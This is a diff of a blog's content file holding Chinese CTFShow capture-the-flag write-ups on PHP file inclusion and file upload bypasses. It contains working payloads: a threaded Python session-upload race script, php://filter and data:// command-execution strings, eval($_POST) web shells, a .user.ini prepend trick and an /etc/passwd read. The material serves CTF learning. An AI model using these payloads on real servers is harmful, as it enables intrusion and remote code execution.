+<p>​    1.编辑一个文件上传的页面:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;目标URL&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    2.将 “目标URL” 跟改为题目地址: 上传一个 txt 文件 内容字母数字随便都可</p>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82.png"></p>
+<pre><code> 3. Bp 抓包:
+</code></pre>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_1.png"></p>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_2.png"></p>
+<p>​    如图所示 在头部 加入 Cookie:PHPSESSID=test ，将 PHP_SESSION_UPLOAD_PROGRESS 内容修改为: <?php system('tac f*.php');?>  再将 Payloads type 设置为 Null payloads, 开启爆破</p>
+<pre><code> 4. 再爆破一个 请求地址 : ?file=/tmp/sess_test  ; sess_test就是产生的一个临时文件 test就是刚刚设置的 Cookie:PHPSESSID=test，现在需要读取这个文件，由于此文件可能会立马删除，因此也需要一个 爆破请求:
+</code></pre>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_3.png"></p>
+<pre><code>5. 观察结果: 在读取目标的请求爆破中查看 响应结果：如下图
+</code></pre>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_4.png"></p>
+<pre><code> 6. 当然也可以写一个 脚本来实现爆破：奈何我是菜鸡🐔一只，参考了大佬的脚本:
+</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://59af8191-fdc8-414f-bb1c-f2726b946851.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Write</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		file = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">		response = session.post(</span><br><span class="line">			url,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, file)&#125;</span><br><span class="line">		)</span><br><span class="line">	<span class="comment"># print(response.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Read</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		response = session.get(url + <span class="string">&#x27;?file=/tmp/sess_&#x27;</span> +sessID)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">			<span class="built_in">print</span>(response.text)</span><br><span class="line">			event.clear()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>*<span class="number">10</span> + <span class="string">&#x27;ReTrying&#x27;</span> + <span class="string">&#x27;+&#x27;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	event = threading.Event()</span><br><span class="line">	event.<span class="built_in">set</span>()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=Write, args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=Read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_5.png"></p>
+<h2 id="web83——文件包含"><a href="#web83——文件包含" class="headerlink" title="web83——文件包含"></a>web83——文件包含</h2><p><strong>同上</strong></p>
+<h2 id="web84——文件包含"><a href="#web84——文件包含" class="headerlink" title="web84——文件包含"></a>web84——文件包含</h2><p><strong>同上</strong></p>
+<h2 id="web85——文件包含"><a href="#web85——文件包含" class="headerlink" title="web85——文件包含"></a>web85——文件包含</h2><p><strong>同上，类似</strong></p>
+<h2 id="web86——文件包含"><a href="#web86——文件包含" class="headerlink" title="web86——文件包含"></a>web86——文件包含</h2><p><strong>同上，类似</strong></p>
+<h2 id="web87——文件包含"><a href="#web87——文件包含" class="headerlink" title="web87——文件包含"></a>web87——文件包含</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong>：</p>
+<ol>
+<li>依旧将 php, data, : , . 替换为了 ???</li>
+<li>GET一个 file, POST一个 content, </li>
+<li>urldecode($fie) 将GET到的file URL解码，既然一开始就要解码那么在将file传入时就得URL编码一次，然而四个str_replace()会将其内容替换，那么害得 URL编码一次，所以一共需要 URL编码两次。（Full URL Encode）</li>
+<li>“<?php die('大佬别秀了');?>“.$content . POST传入的content将和前面这句php拼接在一起。当正常执行的时候，首先执行 die(‘大佬别秀了’) 这个die()将会结束程序的执行，那么我POST传入的内容未被执行，因此需要想办法绕过这个 die() 不然我就狗带了。使用编码绕过比如 将 content按照某个编码进行编码。那么程序在执行时会先进行解码。我们编码的内容当然能正常解码，而前面de die()并不是某个编码所以对die()进行解码就会变成乱码或其他，php将不能认出die()就不会执行die()这样就绕过了die()。后面的content仍然会执行成功。</li>
+</ol>
+<p><strong>试验:</strong></p>
+<ol>
+<li>php://filter/write=string.rot13/resource=2.php 这句话的意思是 将2.php 按照 rot13编码写入到目录中去; Full URL Encode 两次</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">41</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">43</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">44</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">44</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<pre><code> 2. content = &lt;?php system(&#39;tac f*&#39;);?&gt; 进行 rot13编码:
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">content=<span class="meta">&lt;?</span>cuc flfgrz(<span class="string">&quot;gnp s*.cuc&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web87.png"></p>
+<pre><code>3. 如上图执行
+4. 访问 2.php 页面
+</code></pre>
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web87_1.png"></p>
+<h2 id="web88——文件包含"><a href="#web88——文件包含" class="headerlink" title="web88——文件包含"></a>web88——文件包含</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ol>
+<li>正则表达是 匹配了 一大堆东西:</li>
+<li>php , ~, ! , @, #, $, %, ^, &amp;, *, ( ), -, _, +, = .  把键盘数字哪一行都过滤了</li>
+</ol>
+<p><strong>实验：</strong></p>
+<ol>
+<li>使用 data:// 协议</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4</span></span><br><span class="line"><span class="comment">//<span class="meta">&lt;?php</span> system(&#x27;tac f*.php&#x27;);<span class="meta">?&gt;</span> 的 base64 编码为PD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4= </span></span><br><span class="line"><span class="comment">// 因为 题目过滤了 = （等号） 所以在使用时 删掉</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web88.png"></p>
+]]></content>
+      <categories>
+        <category>CTF笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CTFShow-反序列化</title>
     <url>/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="CTFShow-反序列化"><a href="#CTFShow-反序列化" class="headerlink" title="CTFShow 反序列化"></a>CTFShow 反序列化</h1><span id="more"></span>
@@ -192,259 +488,6 @@
 <h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><p>源码:</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>CTF笔记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CTFShow-文件上传</title>
-    <url>/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h1 id="CTFShow-文件上传"><a href="#CTFShow-文件上传" class="headerlink" title="CTFShow 文件上传"></a>CTFShow 文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><span id="more"></span>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151.png"></p>
-<p>先来上传一张正常图片发现不能上传jpg格式，可以上传png格式.并返回了上传路径: /upload/2.png</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
-<p>使用 Burp 抓包将一句话图片更改后缀为.php ,并成功返回了上传路径 /upload/yjh.php</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_2.png"></p>
-<p>蚁剑连接。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_3.png"></p>
-<p>成功在上一级目录中找到了flag<br><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_4.png"></p>
-<p>也可以不用蚁剑，直接访问上传的文件，并post 传入 一句话木马的密码=你想构造的语句。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_5.png"></p>
-<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>后端校验要严密</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152.png"></p>
-<p>上传图片马:<?php eval($_POST[mm]);?> 并抓包修改后缀</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_1.png"></p>
-<p>可见上传成功，似乎和web151一样，蚁剑连接或访问试试</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_2.png"></p>
-<p>当前目录没有，再试试上一级目录。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_3.png"></p>
-<p>还是在上一级目录。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_4.png"></p>
-<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153.png"></p>
-<p>仍然一样的页面</p>
-<p>继续web152的套路试试</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_1.png"></p>
-<p>显示内容为 文件类型不和规，那肯定是对写入的内容进行了过滤。但是不知道过滤了哪些内容。</p>
-<p>这题涉及到了一个新的内容： .user.ini 文件：简单来说是用户对环境的配置文件。</p>
-<p>先上传 .user.ini.png 文件，抓包删除.png后缀</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a <span class="comment">// 文件格式，告知系统这是 GIF89a格式生成图形</span></span><br><span class="line">auto_prepend_file=yjh.png <span class="comment">// 要执行的文件名称,将yjh.png当作Php 执行</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
-<p>再上传 yjh.png木马</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_3.png"></p>
-<p>访问 /upload/index.php 文件</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_4.png"></p>
-<h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154.png"></p>
-<p>仍然一样的页面</p>
-<p>注意和前面一样需要上传  .user.ini 文件才能将 png解析为 php 文件。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
-<p>上传一个图片马 yjh.png : </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_1.png"></p>
-<p>页面显示：文件上传失败，失败原因：文件内容不合规。</p>
-<p>那么可能对文件内容做了过滤，试试PHP短标签，php有很多短标签但是只有 </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>(xxx)<span class="meta">?&gt;</span>  = <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (xxx)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p> 这种形式的使用不受PHP配置的限制，其它几种形式需要PHP开启什么什么才能，不作展示，记不到了。我建议以后直接写这种短标签的形式。</p>
-<p>修改 yjh.png 的内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_post</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>此时修改后的上传成功，并成功返回上传路径。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_2.png"></p>
-<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>上传界面仍然一样！</p>
-<p>继续web154得套路试试:</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
-<p>先上传 .user.ini 文件 再上传 yjh.png</p>
-<p>yjh.png : </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web155.png"></p>
-<p>上传成功！蚁剑连接或者 访问 /upload/index.php 文件</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
-<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>上传界面仍然一样！</p>
-<p>继续web154得套路试试:</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
-<p>先上传 .user.ini 文件 再上传 yjh.png</p>
-<p>yjh.png : </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156.png"></p>
-<p>哦豁，文件内心不合规，看来又是对什么字符进行了过滤。试试之后发现 把 中括号 [] 给干没了，换成大括号 {}</p>
-<p>yjh.png</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;mm&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_1.png"></p>
-<p>上传成功！蚁剑连接或者 访问 /upload/index.php 文件</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_2.png"></p>
-]]></content>
-      <categories>
-        <category>CTF笔记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CTFShow 文件包含笔记</title>
-    <url>/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="CTFShow-文件包含笔记"><a href="#CTFShow-文件包含笔记" class="headerlink" title="CTFShow 文件包含笔记"></a>CTFShow 文件包含笔记</h1><h2 id="web78——文件包含——php伪协议"><a href="#web78——文件包含——php伪协议" class="headerlink" title="web78——文件包含——php伪协议"></a>web78——文件包含——php伪协议</h2><p>源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p><strong>方法一：</strong></p>
-<ol>
-<li>尝试是否可以查看 /etc/passwd中的内容: 发现可以查看</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78.png"></p>
-<ol start="2">
-<li>尝试使用 php://input 协议:</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&quot;tac flag.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_1.png"></p>
